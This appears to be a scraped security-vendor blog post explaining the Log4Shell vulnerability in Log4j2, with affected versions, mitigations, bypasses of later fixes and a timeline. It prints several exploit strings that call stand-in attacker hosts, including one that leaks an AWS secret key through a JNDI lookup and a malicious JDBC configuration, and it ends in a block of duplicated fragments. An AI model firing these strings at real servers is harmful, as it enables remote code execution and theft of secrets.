@@ -1,0 +1,630 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\863x30016.png
+
+On Thursday, Dec 9th 2021, a researcher from the Alibaba Cloud Security Team dropped a zero-day remote code execution exploit on Twitter, targeting the extremely popular log4j logging framework for Java (specifically, the 2.x branch called Log4j2). The vulnerability was originally discovered and reported to Apache by the Alibaba cloud security team on November 24th. MITRE assigned CVE-2021-44228 to this vulnerability, which has since been dubbed Log4Shell by security researchers.
+Since December 9th, the Log4j vulnerability has been reported to be massively exploited in the wild, due to the fact that it is trivially exploitable (weaponized PoCs are available publicly) and extremely popular, and got a wide coverage on media and social networks.
+In this technical blog post, we will clarify the exploitation vectors for this issue, provide accurate research-backed novel information on exactly what is vulnerable (as some reports have been inaccurate), suggest Log4j vulnerability remediations for vendors that cannot easily upgrade their log4j version and answer some burning questions that we’ve been asked on this vulnerability (such as the efficacy of some suggested mitigations floating around in the last couple of days).
+Note: JFrog products are not affected, as they are not using the log4j-core package.
+
+
+What causes the Log4j Log4Shell vulnerability?
+Why is Log4Shell so dangerous?
+When exactly is the Log4j vulnerability exploitable?
+Are JFrog products vulnerable?
+I’m using the log4j-api package, am I vulnerable?
+How can I completely fix the Log4j Log4shell issue?
+Can I mitigate the Log4shell issue without upgrading?
+How can I use JFrog Xray to detect the Log4shell vulnerability?
+
+Exploiting Log4Shell in newer Java versions
+Bypassing LOG4J_FORMAT_MSG_NO_LOOKUPS mitigation using CVE-2021-45046
+Exploiting Log4j2 2.15.0 for remote code execution
+Impact analysis of CVE-2021-45105
+Timeline of Log4Shell related events
+Exploiting Log4j2 2.15.0 for remote code execution – new bypass
+Impact analysis of CVE-2021-44832
+
+What causes the Log4j Log4Shell vulnerability?
+Log4j2 supports by default a logging feature called “Message Lookup Substitution”. This feature enables certain special strings to be replaced, at the time of logging, by other dynamically-generated strings. For example, logging the string Running ${java:runtime} will yield an output similar to:
+Running Java version 1.7.0_67
+It has been discovered that one of the lookup methods, specifically the JNDI lookup paired with the LDAP protocol, will fetch a specified Java class from a remote source and deserialize it, executing some of the class’s code in the process.
+This means that if any part of a logged string can be controlled by a remote attacker, the remote attacker gains remote code execution on the application that logged the string.
+The most common substitution string that takes advantage of this issue will look similar to:
+${jndi:ldap://somedomain.com}
+Note that the following protocols may also be used for exploiting this issue (some of them may not be available by default) –
+${jndi:ldaps://somedomain.com}
+${jndi:rmi://somedomain.com}
+${jndi:dns://somedomain.com} (Allows detecting vulnerable servers, does not lead to code execution.)
+The basic attack flow can be summarized by the following diagram:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\image5.png
+
+Why is Log4Shell so dangerous?
+The vulnerability, which received the highest CVSS score possible – 10.0 – is extremely dangerous due to a number of factors:
+
+Exploitation of the vulnerability is trivial and persistent, with tons of weaponized exploits available on GitHub and other public sources.
+Log4j2 is one of the most popular Java logging frameworks. There are currently almost 7,000 Maven artifacts that depend on log4j-core (the vulnerable artifact), and there are countless others Java projects that use it.
+The vulnerability can easily be used in a drive-by-attack scenario by bombarding random HTTP servers with requests similar to:
+GET / HTTP/1.1
+Host: somedomain.com
+User-Agent: ${jndi:ldap://attacker-srv.com/foo}
+Or alternatively, a specific webapp can be brute-forced by filling all available HTML input fields with the payload string, using automated tools such as XSStrike.
+4. Although the vulnerability is context-dependent, since arbitrary user input must reach one of the Log4j2 logging functions (see next section), this scenario is extremely common. In most logging scenarios, part of the log message contains input from the user. Such input is rarely sanitized since it is considered to be extremely safe.
+When exactly is the Log4j vulnerability exploitable?
+All of the following conditions must apply in order for a specific Java application to be vulnerable:
+
+The Java application uses log4j (Maven package log4j-core) version 2.0.0-2.12.1 or 2.13.0-2.14.1
+
+Version 2.12.2 is not vulnerable, since it received backported fixes from 2.16.0.
+
+Version 2.12.2 is not vulnerable, since it received backported fixes from 2.16.0.
+A remote attacker can cause arbitrary strings to be logged, via one of the logging APIs – logger.info(), logger.debug(), logger.error(), logger.fatal(), logger.log(), logger.trace(), logger.warn().
+No Log4j-specific mitigations have been applied (see the next “Mitigations” section).
+(on some machines) The Java JRE / JDK version in use is older than the following versions:
+
+6u211
+7u201
+8u191
+11.0.1
+
+6u211
+7u201
+8u191
+11.0.1
+This is due to the fact that later versions set the JVM property com.sun.jndi.ldap.object.trustURLCodebase to false by default, which disables JNDI loading of classes from arbitrary URL code bases.
+
+Note that relying only on a new Java version as protection against this vulnerability is risky, since the vulnerability may still be exploited on machines that contain certain “gadget” classes in the classpath of the vulnerable application. See Appendix B – “Exploiting Log4Shell in newer Java versions.”
+
+Are JFrog products vulnerable?
+It’s important to note that JFrog Security has validated that JFrog Platform solutions themselves are not affected, as no products, including Artifactory, Xray, JFrog distribution, Insight, Access or Mission Control, are using the log4j-core package.
+For avoidance of doubt, JFrog products are not affected by any of the following CVEs –
+
+CVE-2021-44228
+CVE-2021-45046
+CVE-2021-45105
+CVE-2021-44832
+I’m using the log4j-api package, am I vulnerable?
+Note that some advisories claimed the Maven package log4j-api was vulnerable to this issue. JFrog’s security research team looked into this claim and concluded that log4j-api (by itself) is not vulnerable. This is due to the lack of JndiLookup functionality, and can be easily seen by trying to trigger the vulnerable code.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\image21.png
+
+Running this code with only log4j-api installed yielded the following output:
+ERROR StatusLogger Log4j2 could not find a logging implementation. Please add log4j-core to the classpath. Using SimpleLogger to log to the console...
+When running the same code with the SimpleLogger class, the lookup string is logged verbatim, but no lookup code is triggered (since it does not exist.)
+How can I completely fix the Log4j Log4shell issue?
+The best fix for this issue would be to upgrade your log4j dependencies to version 2.16.0, which completely resolves the issue by disabling JNDI by default and removing support for message lookups.
+Upgrading to version 2.15.0 will also completely shield default configurations from remote exploitation, although most of the mitigations added by version 2.15.0 have already been bypassed (See Appendix D). To remain future-proof we recommend upgrading to 2.16.0 as soon as possible.
+Can I mitigate the Log4shell vulnerability without upgrading a version?
+Although we recommend fixing the vulnerability completely by upgrading the log4j version to a fixed version, it is possible to completely mitigate the issue without upgrading:
+Method 1: For log4j 2.10.0 and later versions – Disabling lookups:
+Update – This mitigation method can be bypassed in rare non-default configurations, via CVE-2021-45046. See Appendix C for more information. We still recommend vendors that cannot upgrade to a newer Log4j2 version to use both this mitigation method and mitigation method 2 specified below. Mitigation method 2 (removing the vulnerable class) is not affected by CVE-2021-45046.
+If using log4j 2.10.0 or any later version, we recommend disabling message lookups globally by setting the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS to true by executing this command before Java applications are loaded in one of the system’s init scripts:
+export LOG4J_FORMAT_MSG_NO_LOOKUPS=true
+This can also be done system-wide by editing the /etc/environment file and adding:
+LOG4J_FORMAT_MSG_NO_LOOKUPS=true
+This method can be used as an additional protection layer in case you suspect not all dependencies have been properly updated, and even to protect against third-party Java packages that depend/embed a vulnerable version of and have not been properly patched yet.
+Alternatively, lookups can be disabled for a specific invocation of the JVM by adding the following command-line flag when running the vulnerable Java application: ‐Dlog4j2.formatMsgNoLookups=True
+For example –
+java ‐Dlog4j2.formatMsgNoLookups=True -jar vulnerable.jar
+Method 2 – For all 2.x versions: removing the vulnerable class
+On all log4j 2.x versions, it is possible to remove the JndiLookup class from any Java applications by executing this command:
+find ./ -type f -name "log4j-core-*.jar" -exec zip -q -d "{}" org/apache/logging/log4j/core/lookup/JndiLookup.class \;
+This will recursively find all log4j-core JAR files, starting from the current directory, and remove the vulnerable JndiLookup class from them. For full coverage, the command may be executed from the root directory of your project or server.
+Note: This method is recommended only as a last resort since it is possible that the vulnerable JndiLookup class is embedded in recursive JAR files or in locations that the zip command is not accessible to. When choosing this method, it is highly recommended to verify manually that no JndiLookup classes are available to any Java application.
+How can I use JFrog Xray to detect the Log4shell vulnerability?
+Xray customers can scan artifacts as usual for detecting CVE-2021-44228. As always this can be done through CI/CD.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\image31.png
+
+The JFrog CLI:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\image6.png
+
+Or the JFrog IDE plugin:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\image41.png
+
+Vulnerable Example
+Example application that will be vulnerable to remote exploitation (from LunaSec’s advisory):
+
+import org.apache.logging.log4j.LogManager;
+
+import org.apache.logging.log4j.Logger;
+
+ 
+
+import java.io.*;
+
+import java.sql.SQLException;
+
+import java.util.*;
+
+ 
+
+public class VulnerableLog4jExampleHandler implements HttpHandler {
+
+ 
+
+  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());
+
+ 
+
+  /**
+
+   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
+
+   * This is basically pseudo-code to explain the vulnerability, and not a full example.
+
+   * @param he HTTP Request Object
+
+   */
+
+  public void handle(HttpExchange he) throws IOException {
+
+    String userAgent = he.getRequestHeader("user-agent");
+
+ 
+
+    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
+
+    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
+
+    log.info("Request User Agent:{}", userAgent);
+
+ 
+
+    String response = "Hello There, " + userAgent + "!";
+
+    he.sendResponseHeaders(200, response.length());
+
+    OutputStream os = he.getResponseBody();
+
+    os.write(response.getBytes());
+
+    os.close();
+
+  }
+
+}
+
+
+Exploiting Log4Shell in newer Java versions
+Although JNDI remote class loading is disabled in newer Java versions, the message lookup mechanism itself still works, and can be abused for various purposes:
+
+As mentioned before, using a string such as ${jndi:dns://dnsserver.com/somedomain} will cause the victim to send a DNS query to dnsserver.com (querying about the somedomain DNS record). This can be used to detect vulnerable log4j instances, tunnel back data or even as a DDoS attack (given enough vulnerable services)
+There are several lookup substitutions that reveal sensitive information from the victim machine. Most prominently, using the attack string ${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker-srv.com/foo} (with any protocol type) may leak the machine’s secret AWS access key, if this environment variable was exported to the vulnerable log4j process. Naturally, the attack string can be modified to leak any environment variable present in the vulnerable log4j process. Other interesting information-leaking lookups include:
+
+${main:x} – leak the value of command line argument #x, which may contain sensitive data such as passwords or access keys passed through the command line.
+${sys:propname} – leak the value of a Java System Property. For example this can be used to leak the current username (user.name):
+
+${main:x} – leak the value of command line argument #x, which may contain sensitive data such as passwords or access keys passed through the command line.
+${sys:propname} – leak the value of a Java System Property. For example this can be used to leak the current username (user.name):
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\image12.png
+
+As thoroughly explained in this Veracode blog post, there are ways to exploit JNDI injections even on newer versions of Java, where remote deserializations are disabled.
+For example, if the org.apache.naming.factory.BeanFactory class (which is usually shipped with Apache Tomcat servers) is available in the classpath of the vulnerable application that uses log4j, then the Log4Shell vulnerability can be exploited for remote code execution, regardless of the underlying JRE/JDK version.
+This is due to the fact that even though newer versions of Java will not deserialize remote arbitrary classes, the attacker can still control the factory class and its attributes, through the supplied JNDI Reference:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\image11.png
+
+The remote attacker cannot supply an arbitrary factory class, but can reuse any factory class in the vulnerable program’s classpath as a gadget.
+A useable factory class would have the following properties:
+
+Exist in the vulnerable program’s classpath
+Implement the ObjectFactory interface
+Implement the getObjectInstance method
+Perform dangerous actions with the Reference’s attributes
+The researchers identified that the BeanFactory class fits this bill, due to its dangerous use of Reflection – Arbitrary Java code objects are created, based solely on the Reference’s string attributes, which are attacker controlled.
+The blog references full exploit code for hosting an RMI server with the proper Reference that can be used to exploit Log4shell in newer Java versions, on machines where the BeanFactory class is available in the vulnerable application’s classpath.
+Note that the Log4Shell attack string for using such a server will be similar to –
+${jndi:rmi://attacker-srv.com/foo}
+However, the provided RMI server can also be converted to a ldap or ldaps server, in which case the attack string will change accordingly.
+Since other “factory gadgets” such as the BeanFactory class may be found in the future, we highly suggest not relying on a newer Java version as the only line of defense against Log4Shell, and upgrading log4j and/or implementing some of our proposed mitigations.
+As mentioned above, the naive attack vector will instruct the vulnerable Log4j2-based application to retrieve a remote serialized class, usually via LDAP, and load it – allowing the attacker full control on the contents of the class.
+However, LDAP also supports sending a serialized Java Object (instance of a class) in the LDAP request itself, by using the javaSerializedData attribute.
+
+Deserializing the Object is only possible if the Object’s class is available in the current classpath (a list of directories and JAR files that’s searched for classes).
+
+An important distinction is that when deserializing an object, the trustURLCodebase security mitigation has no effect, since that specific mitigation only prevents loading of new codebases.
+It is well-known that some specific Objects can directly lead to remote code execution when they are deserialized – the classes that these Objects are based on are colloquially called “gadgets”.
+
+For example –  the ysoserial proof-of-concept tool aggregates some of these well known gadgets, and allows generation of Objects with arbitrary code execution payloads.
+Therefore – an attacker that knows that a specific “gadget” class is present in the vulnerable application’s classpath, can generate such an Object, send it through LDAP and gain code execution when it is deserialized, regardless of the javaSerializedData attribute.
+Furthermore – due to the information-leaking properties of the vulnerability mentioned above, an attacker may be able to build a fully-automated tool that first queries specific system properties from the vulnerable application (through the use of recursive lookups), determine if any gadget classes are present in the vulnerable application and then build a target-specific payload to gain remote code execution.
+Until today, we have not seen such a tool publicly available or used in the wild, but unfortunately we believe that this malicious campaign is still far from over.
+
+Bypassing the LOG4J_FORMAT_MSG_NO_LOOKUPS mitigation by using CVE-2021-45046
+We would like to preface this section by saying that the prerequisites for performing this bypass are highly unlikely, and as such we still consider the LOG4J_FORMAT_MSG_NO_LOOKUPS mitigation effective in the vast majority of cases.
+Due to the disclosure of CVE-2021-45046, it was revealed that one of the suggested mitigation techniques, namely – disabling the message lookup mechanism, can be bypassed in certain non-default configurations.
+The bottom line is – if CVE-2021-45046 can be exploited on Log4j2 2.10.0 – 2.14.1 (inclusive), it allows the attacker to bypass both the LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable mitigation, and the log4j2.noFormatMsgLookup system property mitigation.
+So – what are the conditions for the exploitation of CVE-2021-45046?
+(Credit to community project log4shell-vulnerable-app that implemented similar example conditions)
+
+A new (non-default) pattern layout must be added to the Log4j2 configuration. The pattern layout must use a Context Lookup (${ctx:). An example of a vulnerable log4j2.properties file –
+# vulnerable in 2.14.1 even with ENV LOG4J_FORMAT_MSG_NO_LOOKUPS true
+appender.console.layout.pattern = ${ctx:useragent} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n
+Note that the Log4j2 configuration can be specified in many different ways, but in any case there are no default Context Lookup pattern layouts –
+
+The vulnerable application must use a Thread Context Map, where the attacker has control of the input data, for example:
+public void handle(HttpExchange he) throws IOException {
+    // userAgent is attacker-controlled
+    String userAgent = he.getRequestHeader("User-Agent"); 
+     
+    // Note that 1st argument matches the variable name from the configured pattern
+    ThreadContext.put("useragent", userAgent); 
+     
+    // The log message itself doesn't need to contain any message lookup
+    log.info("Received a request with User-Agent");
+    ...
+In case both of these conditions exist, an attacker can send an attack token “as usual” – for example in this case, the attacker may send an HTTP request such as –
+and code execution will occur, despite the LOG4J_FORMAT_MSG_NO_LOOKUPS mitigation.
+
+Update #1 – more examples of vulnerable patterns, as tweeted by @pwntester –
+Example pattern layout:
+appender.console.layout.pattern = ${map:tainted} ...
+Example Java code passing user-controlled data (TAINTED):
+MapMessage msg = new StringMapMessage().with("message", "H").with("tainted", TAINTED);
+
+logger.error(msg);
+
+Example pattern layout:
+appender.console.layout.pattern = ${map:tainted} ...
+Example Java code passing user-controlled data (TAINTED):
+logger.info(new ObjectMessage(TAINTED));
+Example pattern layout:
+appender.console.layout.pattern = ${sd:tainted} ...
+Example Java code passing user-controlled data (TAINTED):
+StructuredDataMessage m = new StructuredDataMessage("1", "H", "event");
+
+m.put("tainted", TAINTED);
+
+logger.error(m);
+
+Update #2 – Even more examples of vulnerable patterns, discovered and validated by the JFrog security research team –
+Example pattern layout:
+appender.console.layout.pattern = ${env:TAINTED_ENV_VAR} ...
+
+Example pattern layout:
+appender.console.layout.pattern = ${main:0} ...
+Example Java code passing user-controlled data (TAINTED):
+MainMapLookup.setMainArguments(args);
+
+logger.error("foo");
+
+Event (Message)
+Example configuration:
+<?xml version="1.0" encoding="UTF-8"?> 
+<Configuration status="WARN" name="RoutingTest"> 
+  <Appenders> 
+    <Routing name="Routing"> 
+      <Routes> 
+        <Route pattern="aaa"> 
+          <Console name="STDOUT"> 
+            <PatternLayout> 
+              <pattern>${event:Message} ... </pattern> 
+            </PatternLayout> 
+          </Console> 
+        </Route> 
+      </Routes> 
+    </Routing> 
+  </Appenders> 
+  <Loggers> 
+    <Root level="error"> 
+      <AppenderRef ref="Routing" /> 
+    </Root> 
+  </Loggers> 
+</Configuration>
+logger.info("${jndi:ldap://attacker.com/foo}");
+
+Exploiting Log4j2 2.15.0 for remote code execution
+Log4j2 2.15.0 added a few important mitigations to deny exploitation of Log4Shell (CVE-2021-44228). These are the added mitigations and their current bypass status –
+
+Message lookups are disabled by default – Can be bypassed in specific configurations  (CVE-2021-45046 and more)
+
+Message lookups are disabled by default – Can be bypassed in specific configurations  (CVE-2021-45046 and more)
+
+
+allowedJndiProtocols – JNDI only allowed the following protocols by default – LDAP, LDAPS, Java (local) – No known bypass
+
+allowedJndiProtocols – JNDI only allowed the following protocols by default – LDAP, LDAPS, Java (local) – No known bypass
+
+
+allowedLdapHosts – JNDI over LDAP may only access the local host by default (127.0.0.1/localhost) – Can be bypassed in specific operating systems (macOS, FreeBSD, Fedora, Arch Linux and Alpine Linux)
+
+allowedLdapHosts – JNDI over LDAP may only access the local host by default (127.0.0.1/localhost) – Can be bypassed in specific operating systems (macOS, FreeBSD, Fedora, Arch Linux and Alpine Linux)
+
+
+allowedLdapClasses – JNDI over LDAP may only load Java primitive classes by default – Can always be bypassed
+
+allowedLdapClasses – JNDI over LDAP may only load Java primitive classes by default – Can always be bypassed
+
+Due to the bypasses of mitigations #3 and #4, CVE-2021-45046 was upgraded from “Low” (3.7) severity to “Critical” (9.0) severity, since exploiting it immediately leads to RCE. That being said, as we mentioned above we still consider the prerequisites for the exploitation of CVE-2021-45046 as highly unlikely, due to them requiring a rare non-default configuration.
+Here are some more details about the specific bypasses –
+This mitigation can be bypassed by –
+
+Any one of the configurations specified in Appendix C
+
+Any one of the configurations specified in Appendix C
+
+
+If the application explicitly allowed for message lookup, by defining a pattern layout containing %m{lookups} in one of the configuration files. For example – appender.console.layout.pattern = %m{lookups}
+
+If the application explicitly allowed for message lookup, by defining a pattern layout containing %m{lookups} in one of the configuration files. For example – appender.console.layout.pattern = %m{lookups}
+
+As mentioned, bypassing this mitigation in Log4j2 2.15.0 currently directly leads to RCE.
+
+As tweeted by @marcioalm, an attack string similar to ${jndi:ldap://127.0.0.1#evilhost.com:1389/a} will bypass the localhost restriction, but end up contacting the remote evilhost.com We were able to reproduce this bypass only when the vulnerable application runs on macOS and FreeBSD. External sources have also reported Fedora, Arch Linux and Alpine Linux as vulnerable. On other operating systems Java throws an UnknownHostException (tested on Ubuntu, Debian & Windows)
+
+Note that both of the following bypasses will work on version 2.16.0 as well, if JNDI has been enabled by a non-default configuration
+This vulnerability was independently discovered and disclosed to Apache by JFrog’s security research team and other security researchers.
+The class-loading mitigation introduced in version 2.15.0 first inspects the requested LDAP attributes by calling getAttributes and later loads the class/object specified by LDAP by calling lookup:
+if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) {
+	if (!allowedHosts.contains(uri.getHost())) {
+		LOGGER.warn("Attempt to access ldap server not in allowed list");
+		return null;
+	}
+	// GET THE CLASS ATTRIBUTES
+	Attributes attributes = this.context.getAttributes(name);
+	if (attributes != null) {
+		// CLASS LOADING CHECKS HERE
+		...
+	}
+	...
+}
+...
+// LOAD THE CLASS
+return (T) this.context.lookup(name);
+...
+However – both the getAttributes and lookup calls will cause separate LDAP requests to be sent
+A malicious server is not required to send back the same LDAP response for both the getAttributes and lookup requests.
+Therefore – an attacker can easily implement an LDAP server which operates as follows –
+
+On LDAP request #1 – Send back a response with NULL attributes (will cause the package code to skip all attributes checking)
+On LDAP request #2 – Send back a malicious response (ex. the attacker’s URL in javaCodeBase)
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\Log4Shell_bypass.png
+
+This is a classic Time-of-Check, Time-of-Use (ToCToU) attack, albeit without a race condition as the attacker’s server is consulted synchronously.
+Advantages – Does not rely on a “gadget” class being available in the classpath of the vulnerable application
+
+Disadvantages – Loading a remote codebase is blocked in newer Java versions (where trustURLCodebase is false)
+When deserializing an embedded Java object, the check for the object’s class was implemented in an incomplete manner, since the class comparison is done by name only:
+if (attributeMap.get(SERIALIZED_DATA) != null) {
+	if (classNameAttr != null) {
+		String className = classNameAttr.get().toString();
+		if (!allowedClasses.contains(className)) {
+			LOGGER.warn("Deserialization of {} is not allowed", className);
+			return null;
+		}
+Therefore – an attacker can specify an arbitrary serialized object in the LDAP response,  but set the javaClassName to one of the primitive types to bypass the check – private static final List permanentAllowedClasses = Arrays.asList(Boolean.class.getName(),
+
+Byte.class.getName(), Character.class.getName(), Double.class.getName(), Float.class.getName(),
+
+Integer.class.getName(), Long.class.getName(), Short.class.getName(), String.class.getName());
+Similarly to the previous serialized object bypass, this relies on the victim having the appropriate “gadget” class of the serialized object in the local classpath.
+Advantages – Works on newer Java versions (where trustURLCodebase is false)
+
+Disadvantages – Relies on a “gadget” class being available in the classpath of the vulnerable application
+
+Impact analysis of CVE-2021-45105 in Log4j2
+Recently, a new denial of service CVE in Log4j2 was published – CVE-2021-45105, with CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H). The JFrog security team has validated the CVE data and claims on version 2.16.0, and estimated a CVSS of 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L). This estimation is based on the following –
+Although not explicitly specified in the CVE, the prerequisites for this attack are exactly the same as CVE-2021-45046 – namely, the attacker must control a non-message part of one of the pattern layouts. Therefore, the exploitation case mentioned in the CVE (“attacker with control over Thread Context Map”) is only one of the applicable cases. In reality, an attacker can abuse any non-default configuration as specified in Appendix C. For example – a configured pattern with a MapMessage will also make the application vulnerable to this CVE (as long as the attacker controls the tainted variable)  – appender.console.layout.pattern = ${map:tainted} - %-5p %c{1}:%L - %m%n From our perspective, the requirement for such a non-default (and unlikely) configuration raises the attack complexity of this issue to “High”.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214536_135319\CVE202145105_exception.png
+Running the public exploit string – ${::-${::-${}}} on a vulnerably-configured Log4j2 version 2.16.0, yields an IllegalStateException –  The PoC string does not cause any excessive CPU or memory usage, and as such the DoS impact (if any) should not have any system-wide impact. Since by default exceptions are ignored in Log4j2 Appenders (logged only, not thrown) , the thrown exception does not crash the server and as such the DoS impact is completely mitigated:
+private void handleAppenderError(final LogEvent event, final RuntimeException ex) {
+    appender.getHandler().error(createErrorMsg("An exception occurred processing Appender "), event, ex);
+    if (!appender.ignoreExceptions()) { // ignoreExceptions=true, by default
+        throw ex;
+    }
+}
+The issue can be fixed by upgrading Log4j2 to version 2.17.0.
+The official fix (version 2.17.0) changes the StrSubstitutor  logic to handle the PoC’s edge case, and does not throw any exceptions when faced with a similar input.
+
+For legacy (Java 7) users, it has been hinted that version 2.12.3 will be released to fix this issue, although at the time of writing no such version is available.
+
+Note that this issue is not related to JNDI, and as such all previous proposed mitigations (ex. removing the JndiLookup class) will not mitigate this issue.
+To mitigate this issue, in non-default cases where the exception is not ignored, vendors can wrap the logging code with an exception handler, so that DoS will not occur.
+
+To summarize – this CVE currently does not seem to pose a real-world threat to production web applications.
+
+As mentioned, JFrog’s real-world estimated CVSS is 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)
+
+We advise vendors to focus on upgrading any older Log4j2 deployments to 2.16.0, before tackling the task of upgrading 2.16.0 deployments to 2.17.0.
+
+Log4shell timeliene
+18.07.2013 – The vulnerable JNDI lookup feature was committed.
+
+24.11.2021 – Chen Zhaojun, an employee of Alibaba reported on the vulnerability to Apache.
+
+26.11.2021 – CVE-2021-44228 was assigned in MITRE.
+
+01.12.2021 – Earliest evidence for exploitation of the vulnerability (according to Cloudflare), might suggest that the vulnerability details were leaked before public disclosure.
+
+05.12.2021 – Apache’s developers created a bug ticket for resolving the issue, release version 2.15.0 is marked is the target fix version.
+
+09.12.2021 – CVE-2021-44228 went public (the original Log4Shell CVE).
+
+09.12.2021 – A security researcher dropped a zero-day remote code execution exploit on Twitter. The tweet was later deleted.
+
+10.12.2021 – Version 2.15.0 was released (fixes CVE-2021-44228) with a fix that disables message lookups by default, and restricts JNDI operation to specific classes & hostnames.
+
+10.12.2021 – Detected attacks on Minecraft servers.
+
+13.12.2021 – Version 2.16.0 was released (fixes CVE-2021-45046) which completely removes message lookups (cannot be enabled in any configuration) and disables JNDI support by default (can be re-enabled).
+
+14.12.2021 – CVE-2021-45046 went public, showing that Log4Shell can still be exploited on non-default configurations, but without a severe effect.
+
+15.12.2021 – Version 2.12.2 was released (with similar fixes to 2.16.0) for backport support to Java 7.
+
+16.12.2021 – The CVSS for CVE-2021-45046 was raised to 9.0, due to discovering several bypasses for the hostname and classes mitigations on Log4J 2.15.0.
+
+18.12.2021 – CVE-2021-45105 went public, showing a minor bug in Log4J’s string substitution, that may cause an exception to be thrown, in non-default configurations.
+
+18.12.2021 – Version 2.17.0 was released (fixes CVE-2021-45105) which reimplemented string substitution and locked down JNDI to be used only locally.
+
+22.12.2021 – Version 2.12.3 was released (with similar fixes to 2.17.0) for backport support to Java 7.
+
+22.12.2021 – Version 2.3.1 was released (with similar fixes to 2.17.0) for backport support to Java 6.
+
+Impact analysis of CVE-2021-44832
+An additional remote code execution CVE in Log4j2 2.17.0 was published – CVE-2021-44832, with CVSS 6.6 (AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H).
+The CVE was fixed in versions 2.17.1 (Java 8), 2.13.4 (Java 7) and 2.3.2 (Java 6).
+The CVE has extremely high prerequisites (detailed below) and as such is unlikely to affect any real-world system.
+At this point, we do not believe upgrading from Log4j2 2.17.0 (or equivalent versions) is critical.
+Currently, exploitation of the vulnerability is possible only if the attacker has direct control of Log4J’s configuration file, and specifically if the attacker can add a “JDBCAppender” with arbitrary attributes.
+The vulnerability is caused due to the “JDBCAppender” accepting a JNDI data source in its DataSource attribute.
+
+When accessing a JNDI data source, remote protocols (such as LDAP) are still available, which means that specifying a string such as ldap://attacker.com:1337 will cause the vulnerable app to contact the attacker’s server, which can provide a remote class or serialized object to load.
+This is an extremely minimal configuration file that will trigger the vulnerability:
+<?xml version="1.0" encoding="UTF-8"?>
+<Configuration status="WARN" name="Config1">
+  <Appenders>
+    <JDBC name="jdbcTest">
+      <DataSource jndiName="ldap://attacker.com:1337/Exploit" />
+    </JDBC>
+  </Appenders>
+</Configuration>
+As mentioned, Log4j can be configured via many different formats (JSON, YAML, properties, etc.), therefore this is just one example of a working PoC.
+Note that the vulnerable application does not actually have to log anything, but the logger does need to be initialized, for example like so –
+Logger logger = LogManager.getLogger("HelloWorld");
+The issue can be fixed by upgrading Log4j2 to version 2.17.1 (Java 8), 2.13.4 (Java 7) or 2.3.2 (Java 6).
+The official fix disables the JNDI support for the JDBCAppender (by default) and adds a system property called log4j2.enableJndiJdbc that allows re-enabling it.
+In addition, JDBC now reuses the common JNDIManager class, which means all previous restrictions on JNDI will apply, even when “enableJndiJdbc” is configured (ex. only the local java protocol is allowed in connection strings)
+Similarly to the well-known Log4Shell mitigation, it is possible to remove the “JdbcAppender.class” file from the Log4J JAR file –
+find ./ -type f -name "log4j-core-*.jar" -exec zip -q -d "{}" org/apache/logging/log4j/core/appender/db/jdbc/JdbcAppender.class \;
+
+Read all about the NEW Zero-Day SpringShell Vulnerability
+Running ${java:runtime}
+Running Java version 1.7.0_67
+${jndi:ldap://somedomain.com}
+${jndi:ldaps://somedomain.com}
+${jndi:rmi://somedomain.com}
+${jndi:dns://somedomain.com}
+GET / HTTP/1.1
+Host: somedomain.com
+User-Agent: ${jndi:ldap://attacker-srv.com/foo}
+
+Version 2.12.2 is not vulnerable, since it received backported fixes from 2.16.0.
+logger.info()
+logger.debug()
+logger.error()
+logger.fatal()
+logger.log()
+logger.trace()
+logger.warn()
+
+6u211
+7u201
+8u191
+11.0.1
+com.sun.jndi.ldap.object.trustURLCodebase
+JndiLookup
+ERROR StatusLogger Log4j2 could not find a logging implementation. Please add log4j-core to the classpath. Using SimpleLogger to log to the console...
+SimpleLogger
+LOG4J_FORMAT_MSG_NO_LOOKUPS
+true
+export LOG4J_FORMAT_MSG_NO_LOOKUPS=true
+/etc/environment
+LOG4J_FORMAT_MSG_NO_LOOKUPS=true
+‐Dlog4j2.formatMsgNoLookups=True
+java ‐Dlog4j2.formatMsgNoLookups=True -jar vulnerable.jar
+JndiLookup
+JndiLookup
+JndiLookup
+JndiLookup
+
+${jndi:dns://dnsserver.com/somedomain}
+${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker-srv.com/foo}
+
+${main:x} – leak the value of command line argument #x, which may contain sensitive data such as passwords or access keys passed through the command line.
+${sys:propname} – leak the value of a Java System Property. For example this can be used to leak the current username (user.name):
+${main:x}
+${sys:propname}
+user.name
+org.apache.naming.factory.BeanFactory
+ObjectFactory
+getObjectInstance
+Reference
+BeanFactory
+BeanFactory
+${jndi:rmi://attacker-srv.com/foo}
+BeanFactory
+javaSerializedData
+trustURLCodebase
+javaSerializedData
+LOG4J_FORMAT_MSG_NO_LOOKUPS
+LOG4J_FORMAT_MSG_NO_LOOKUPS
+LOG4J_FORMAT_MSG_NO_LOOKUPS
+log4j2.noFormatMsgLookup
